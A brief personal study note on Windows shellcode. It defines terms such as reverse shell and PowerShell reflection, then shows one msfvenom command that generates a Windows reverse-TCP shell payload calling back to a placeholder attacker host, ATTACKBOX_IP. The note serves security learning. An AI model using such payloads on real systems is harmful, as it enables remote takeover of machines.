#cybersecurity #shellcodes


### Essential Terminologies

- **Shellcode**: piece of code usually used by malicious actors during exploits to inject command. Typically written in assembly
- **Powershell**: scripting language and command-line shell built into Windows
- **Windows Defender**: built-in security feature
- **Windows API**: this allows programs to interact with the underlying operating system.
- **Accessing Windows API though PowerShell Reflection**: advanced technique that enables dynamic interaction with the Windows API
- **Reverse shell**: a type of connection in wich the target initiates a connection back to your attacking machine


### Generating Shellcode
We use `msfvenom`

```bash
msfvenom -p windows/x64/shell_reverse_tcp LHOST=ATTACKBOX_IP LPORT=1111 -f powershell
```